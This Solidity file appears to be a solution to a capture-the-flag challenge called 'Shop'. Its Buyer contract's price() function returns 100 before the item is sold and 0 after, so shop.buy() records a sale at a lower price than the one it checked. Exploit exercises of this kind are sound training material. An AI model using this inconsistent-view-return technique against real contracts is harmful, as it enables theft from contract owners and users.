// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./21Shop.sol";

contract Buyer {
    Shop public shop;

    constructor(address shopAddress) {
        shop = Shop(shopAddress);
    }

    function price() public view returns (uint256) {
        if (shop.isSold() == false) return 100;
        else return 0;
    }

    function solveChallenge() public {
        shop.buy();
    }
}
